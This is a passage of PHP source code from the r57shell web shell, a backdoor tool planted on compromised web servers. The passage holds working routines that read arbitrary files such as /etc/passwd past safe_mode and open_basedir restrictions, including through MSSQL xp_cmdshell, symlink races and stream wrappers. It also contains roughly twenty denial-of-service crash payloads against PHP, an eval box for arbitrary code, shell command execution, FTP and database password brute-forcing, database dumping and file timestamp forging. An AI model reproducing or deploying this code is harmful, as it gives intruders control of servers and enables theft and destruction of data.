     echo "$file\n";
    }
   $d->close();
   }
  else if(@function_exists('glob'))
   { 
       function eh($errno, $errstr, $errfile, $errline)
        {
          global $D, $c, $i; 
          preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o); 
          if($o){ $D[$c] = $o[2]; $c++;} 
        }
       $error_reporting = @ini_get('error_reporting');
       error_reporting(E_WARNING); 
       @ini_set("display_errors", 1); 
       $root = "/"; 
       if($dir) $root = $dir; 
       $c = 0; $D = array(); 
       @set_error_handler("eh"); 
       $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
       for($i=0; $i < strlen($chars); $i++)
       {
        $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}"; 
        $prevD = $D[count($D)-1]; 
        @glob($path."*"); 
        if($D[count($D)-1] != $prevD)
         {
           for($j=0; $j < strlen($chars); $j++)
           {
            $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}"; 
            $prevD2 = $D[count($D)-1]; 
            @glob($path."*"); 
            if($D[count($D)-1] != $prevD2)
             {
              for($p=0; $p < strlen($chars); $p++)
               {
                $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}"; 
                $prevD3 = $D[count($D)-1]; 
                @glob($path."*"); 
                if($D[count($D)-1] != $prevD3)
                 {
                  for($r=0; $r < strlen($chars); $r++)
                   {
                    $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}"; 
                    @glob($path."*"); 
                   } 
                 }        
               } 
             }        
           }    
         } 
       } 
       $D = array_unique($D); 
       foreach($D as $item) echo htmlspecialchars("{$item}")."\r\n"; 
       error_reporting($error_reporting);
   }
  else echo $lang[$language.'_text29'];
 break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']);
  $cf = @curl_exec($ci);
  echo htmlspecialchars($cf);
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
     @mysql_query("CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL )");
     @mysql_query("LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table");
     $r = @mysql_query("SELECT * FROM temp_r57_table");
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0])."\r\n"; }
     @mysql_query("DROP TABLE IF EXISTS temp_r57_table");
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo htmlspecialchars($row[0])."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  $temp=tempnam($dir, "fname");
  if (@file_exists($temp)) @unlink($temp);
  $extra = "-C ".$_POST['test5_file']." -X $temp";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $str = moreread($temp);
  echo htmlspecialchars($str);
  @unlink($temp);
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i < count($dir_list); $i++) echo htmlspecialchars($dir_list[$i])."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo htmlspecialchars($str);
  @imap_close($stream);
  break;
  case 'test8':
  $temp=@tempnam($_POST['test8_file2'], "copytemp");
  $str = readzlib($_POST['test8_file1'],$temp);
  echo htmlspecialchars($str);
  @unlink($temp);
  break;
  case 'test9':
  @ini_restore("safe_mode");
  @ini_restore("open_basedir");
  $str = moreread($_POST['test9_file']);
  echo htmlspecialchars($str);
  break;
  case 'test10':
  @ob_clean();
  $error_reporting = @ini_get('error_reporting');
  error_reporting(E_ALL ^ E_NOTICE);
  @ini_set("display_errors", 1); 
  $str=fopen($_POST['test10_file'],"r");
  while(!feof($str)){print htmlspecialchars(fgets($str));}
  fclose($str);
  error_reporting($error_reporting);
  break;
  case 'test11':
  @ob_clean();
  $temp = 'zip://'.$_POST['test11_file'];
  $str = moreread($temp);
  echo htmlspecialchars($str);
  break;
  case 'test12':
  @ob_clean();
  $temp = 'compress.bzip2://'.$_POST['test12_file'];
  $str = moreread($temp);
  echo htmlspecialchars($str);
  break;
  case 'test13':
  @error_log($_POST['test13_file1'], 3, "php://../../../../../../../../../../../".$_POST['test13_file2']);
  echo $lang[$language.'_text61'];
  break;
  case 'test14':
  @session_save_path($_POST['test14_file2']."\0;/tmp");
  @session_start();
  @$_SESSION[php]=$_POST['test14_file1'];
  echo $lang[$language.'_text61'];
  break;
  case 'test15':
  
  @readfile($_POST['test15_file1'], 3, "php://../../../../../../../../../../../".$_POST['test15_file2']);
  echo $lang[$language.'_text61'];
  break;
  case 'test16':
  if (fopen('srpath://../../../../../../../../../../../'.$_POST['test16_file'],"a")) echo $lang[$language.'_text61'];
  break;
  case 'test17_1':
  @unlink('symlinkread');
  @symlink('a/a/a/a/a/a/', 'dummy');
  @symlink('dummy/../../../../../../../../../../../'.$_POST['test17_file'], 'symlinkread');
  @unlink('dummy');
  while (1) 
   {
    @symlink('.', 'dummy');
    @unlink('dummy');
   }
  break;
  case 'test17_2':
  $str='';
  while (strlen($str) < 3) {   
   $temp = 'symlinkread';
   $str = moreread($temp);
   if($str){ @ob_clean(); echo htmlspecialchars($str);}
  }
  break;
  case 'test17_3':
  $dir = $files = array();
  if(@version_compare(@phpversion(),"5.0.0")>=0){
   while (@count($dir) < 3) {
    $dir=@scandir('symlinkread');
    if (@count($dir) > 2) {@ob_clean(); @print_r($dir); }
   }
  }
  else {
   while (@count($files) < 3) {
    $dh  = @opendir('symlinkread');
    while (false !== ($filename = @readdir($dh))) {
     $files[] = $filename;
    }
    if(@count($files) > 2){@ob_clean(); @print_r($files); }
   }
  }
  break;
 }
}
if((!$safe_mode) && ($_POST['cmd']!="php_eval") && ($_POST['cmd']!="mysql_dump") && ($_POST['cmd']!="db_query") && ($_POST['cmd']!="ftp_brute") && ($_POST['cmd']!="db_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}

switch($_POST['cmd'])
{
 case 'dos1':
 function a() { a(); } a();
 break;
 case 'dos2':
 @pack("d4294967297", 2);
 break;
 case 'dos3':
 $a = "a";@unserialize(@str_replace('1', 2147483647, @serialize($a)));
 break;
 case 'dos4':
 $t = array(1);while (1) {$a[] = &$t;};
 break;
 case 'dos5':
 @dl("sqlite.so");$db = new SqliteDatabase("foo");
 break;
 case 'dos6':
 preg_match('/(.(?!b))*/', @str_repeat("a", 10000));
 break;
 case 'dos7':
 @str_replace("A", str_repeat("B", 65535), str_repeat("A", 65538));
 break;
 case 'dos8':
 @shell_exec("killall -11 httpd");
 break;
 case 'dos9':
 function cx(){ @tempnam("/www/", "../../../../../../var/tmp/cx"); cx(); } cx();
 break;
 case 'dos10':
 $a = @str_repeat ("A",438013);$b = @str_repeat ("B",951140);@wordwrap ($a,0,$b,0);
 break;
 case 'dos11':
 @array_fill(1,123456789,"Infigo-IS");
 break;
 case 'dos12':
 @substr_compare("A","A",12345678);
 break;
 case 'dos13':
 @unserialize("a:2147483649:{");
 break;
 case 'dos14':
 $Data = @str_ireplace("\n", "<br>", $Data);
 break;
 case 'dos15':
 function toUTF($x) {return chr(($x >> 6) + 192) . chr(($x & 63) + 128);}
 $str1 = "";for($i=0; $i < 64; $i++){ $str1 .= toUTF(977);}
 @htmlentities($str1, ENT_NOQUOTES, "UTF-8");
 break;
 case 'dos16':
 $r = @zip_open("x.zip");$e = @zip_read($r);$x = @zip_entry_open($r, $e);
 for ($i=0; $i<1000; $i++) $arr[$i]=array(array(""));
 unset($arr[600]);@zip_entry_read($e, -1);unset($arr[601]);
 break;
 case 'dos17':
 $z = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"; 
 $y = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"; 
 $x = "AQ                                                                        "; 
 unset($z);unset($y);$x = base64_decode($x);$y = @sqlite_udf_decode_binary($x);unset($x);
 break;
 case 'dos18':
 $MSGKEY = 519052;$msg_id = @msg_get_queue ($MSGKEY, 0600); 
 if (!@msg_send ($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err)) 
 echo "Msg not sent because $msg_err\n"; 
 if (@msg_receive ($msg_id, 1, $msg_type, 0xffffffff, $_SESSION, false, 0, $msg_error)) { 
 echo "$msg\n"; 
 } else { echo "Received $msg_error fetching message\n"; break; } 
 @msg_remove_queue ($msg_id);
 break;
 case 'dos19':
 $url = "php://filter/read=OFF_BY_ONE./resource=/etc/passwd"; @fopen($url, "r");
 break;
 case 'dos20':
 $hashtable = str_repeat("A", 39);
 $hashtable[5*4+0]=chr(0x58);$hashtable[5*4+1]=chr(0x40);$hashtable[5*4+2]=chr(0x06);$hashtable[5*4+3]=chr(0x08);
 $hashtable[8*4+0]=chr(0x66);$hashtable[8*4+1]=chr(0x77);$hashtable[8*4+2]=chr(0x88);$hashtable[8*4+3]=chr(0x99);
 $str = 'a:100000:{s:8:"AAAABBBB";a:3:{s:12:"0123456789AA";a:1:{s:12:"AAAABBBBCCCC";i:0;}s:12:"012345678AAA";i:0;s:12:"012345678BAN";i:0;}';
 for ($i=0; $i<65535; $i++) { $str .= 'i:0;R:2;'; }
 $str .= 's:39:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:39:"'.$hashtable.'";i:0;R:3;';
 @unserialize($str);
 break;
}

if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}

if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 if($_POST['brute_method']=='passwd'){
 foreach($users as $user)
  {
    $connection = @ftp_connect($ftp_server,$ftp_port,10);
    if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
    else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } } 
    @ftp_close($connection);
  }
 }else if(($_POST['brute_method']=='dic') && isset($_POST['ftp_login'])){
  foreach($users as $user)
  {
    $connection = @ftp_connect($ftp_server,$ftp_port,10);
    if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo "[+] ".$_POST['ftp_login'].":$user - success\r\n"; $suc++; }
    @ftp_close($connection);
  }
 }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse']) && ($_POST['brute_method']=='passwd')) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }

if ($_POST['cmd']=="db_brute")
 {
 $suc = 0;
 if($_POST['brute_method']=='passwd'){
 foreach($users as $user)
  {
   $sql = new my_sql();
   $sql->db   = $_POST['db'];
   $sql->host = $_POST['db_server'];
   $sql->port = $_POST['db_port'];
   $sql->user = $user;
   $sql->pass = $user;
   if($sql->connect()) { echo "[+] $user:$user - success\r\n"; $suc++; }
  }
 if(isset($_POST['reverse']))
  {
   foreach($users as $user)
    {
     $sql = new my_sql();
     $sql->db   = $_POST['db'];
     $sql->host = $_POST['db_server'];
     $sql->port = $_POST['db_port'];
     $sql->user = $user;
     $sql->pass = strrev($user);
     if($sql->connect()) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; }
    }
  }
 }else if(($_POST['brute_method']=='dic') && isset($_POST['mysql_l'])){
  foreach($users as $user)
  {
   $sql = new my_sql();
   $sql->db   = $_POST['db'];
   $sql->host = $_POST['db_server'];
   $sql->port = $_POST['db_port'];
   $sql->user = $_POST['mysql_l'];
   $sql->pass = $user;
   if($sql->connect()) { echo "[+] ".$_POST['mysql_l'].":$user - success\r\n"; $suc++; }
  }
 }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse']) && ($_POST['brute_method']=='passwd')) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }

if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
   else if($fp || @function_exists('file_put_contents')){ foreach($sql->dump as $v){ @fwrite($fp,$v."\r\n") or @fputs($fp,$v."\r\n") or @file_put_contents($_POST['dif_name'],$v."\r\n");} } 
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 } 

echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";

function div_title($title, $id)
{
  return '<a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');">'.$title.'</a>';
}
function div($id)
 { 
 if(isset($_COOKIE[$id]) && ($_COOKIE[$id]==0)) return '<div id="'.$id.'" style="display: none;">'; 
 $divid=array('id5','id6','id8','id9','id10','id11','id16','id24','id25','id26','id27','id28','id29','id33','id34','id35','id37','id38');
 if(empty($_COOKIE[$id]) && @in_array($id,$divid)) return '<div id="'.$id.'" style="display: none;">'; 
 return '<div id="'.$id.'">';
 }
 
if(!$safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;

if($safe_mode || $open_basedir){
echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'</div>'.$table_end1.$fe;
}

if($unix && @function_exists('touch')){
echo $fs.$table_up1.div_title($lang[$language.'_text128'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','file_name',40,(!empty($_POST['file_name'])?($_POST['file_name']):($dir."/r57shell.php")))
.ws(4)."<b>".$lang[$language.'_text26'].ws(2).$lang[$language.'_text59'].$arrow."</b>"
.ws(2).in('text','file_name_r',40,(!empty($_POST['file_name_r'])?($_POST['file_name_r']):(""))));
echo sr(15,"<b> or set  Day".$arrow."</b>",
'
<select name="day" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select>'
.ws(4)."<b>Month".$arrow."</b>"
.'
<select name="month" size="1">
<option value="January">January</option>
<option value="February">February</option>
<option value="March">March</option>
<option value="April">April</option>
<option value="May">May</option>
<option value="June">June</option>
<option value="July">July</option>
<option value="August">August</option>
<option value="September">September</option>
<option value="October">October</option>
<option value="November">November</option>
<option value="December">December</option>
</select>'
.ws(4)."<b>Year".$arrow."</b>"
.'
<select name="year" size="1">
<option value="1998">1998</option>
<option value="1999">1999</option>
<option value="2000">2000</option>
<option value="2001">2001</option>
<option value="2002">2002</option>
<option value="2003">2003</option>
<option value="2004">2004</option>
<option value="2005">2005</option>
<option value="2006">2006</option>
<option value="2006">2007</option>
<option value="2006">2008</option>
<option value="2006">2009</option>
<option value="2006">2010</option>
</select>'
.ws(4)."<b>Hour".$arrow."</b>"
.'
<select name="chasi" size="1">
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
</select>'
.ws(4)."<b>Minute".$arrow."</b>"
.'
<select name="minutes" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select>'
.ws(4)."<b>Second".$arrow."</b>"
.'
<select name="second" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select>'
.in('hidden','cmd',0,'touch')
.in('hidden','dir',0,$dir)
.ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

$select='';
if(@function_exists('chmod')){$select .= "<option value=mod>CHMOD</option>";}
if(@function_exists('chown')){$select .= "<option value=own>CHOWN</option>";}
if(@function_exists('chgrp')){$select .= "<option value=grp>CHGRP</option>";}
if($unix && $select){
echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id6').$table_up2.div('id6').$ts;
echo @sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','param1',55,(($_POST['param1'])?($_POST['param1']):($dir."/r57shell.php"))).ws(2)."<b>".$lang[$language.'_text68'].$arrow."</b>"."<select name=what>".$select."</select>".ws(4).in('text','param2 title="'.$lang[$language.'_text71'].'"',10,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));  
echo $te.'</div>'.$table_end1.$fe;
}

if(!$safe_mode){
$aliases2 = '';
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id7').$table_up2.div('id7').$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id8').$table_up2.div('id8').$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;

if(!$safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id9').$table_up2.div('id9').$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id10').$table_up2.$font;
echo "<div align=center>".div('id10')."<textarea name=php_eval cols=100 rows=10>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");\r\n//file_get_content(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;

if($safe_mode || $open_basedir)
{
echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && $curl_on && @version_compare(@phpversion(),"5.2.0")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id12').$table_up2.div('id12').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && $mysql_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id13').$table_up2.div('id13').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && $mssql_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && $unix && @function_exists('mb_send_mail') && @version_compare(@phpversion(),"5.2.0")<=0){
echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

